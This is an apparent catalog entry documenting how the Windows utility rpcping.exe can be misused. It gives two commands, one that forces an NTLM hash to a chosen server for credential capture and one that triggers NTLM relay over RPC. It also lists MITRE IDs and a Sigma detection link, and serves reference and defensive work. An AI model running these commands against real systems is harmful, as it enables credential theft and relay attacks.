---
Name: Rpcping.exe
Description: Used to verify rpc connection
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
    Description: Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.
    Usecase: Capture credentials on a non-standard port
    Category: Credentials
    Privileges: User
    MitreID: T1003
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
    Description: Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).
    Usecase: Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port
    Category: Credentials
    Privileges: User
    MitreID: T1187
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\rpcping.exe
  - Path: C:\Windows\SysWOW64\rpcping.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_rpcping.yml
Resources:
  - Link: https://github.com/vysec/RedTips
  - Link: https://twitter.com/vysecurity/status/974806438316072960
  - Link: https://twitter.com/vysecurity/status/873181705024266241
  - Link: https://twitter.com/splinter_code/status/1421144623678988298
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
  - Person: Vincent Yiu
    Handle: '@vysecurity'
  - Person: Antonio Cocomazzi
    Handle: '@splinter_code'
  - Person: ap
    Handle: '@decoder_it'
---
